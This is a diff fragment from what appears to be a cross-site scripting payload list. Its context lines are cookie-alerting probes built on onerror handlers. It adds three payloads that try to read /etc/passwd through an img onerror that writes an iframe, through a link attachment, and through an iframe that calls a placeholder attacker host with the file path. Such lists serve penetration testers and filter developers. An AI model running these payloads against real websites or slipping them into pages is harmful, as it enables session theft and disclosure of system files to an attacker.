@@ -107,3 +107,6 @@ javascript:alert(document.cookie)
 ?s="onerror="window.onerror=alert;throw 1337"
 ?s="onerror="alert%261par;1337%26rpar;"
 ?s="onerror="alert`1337`"
+<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>
+<link rel=attachment href="file:///etc/passwd">
+<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
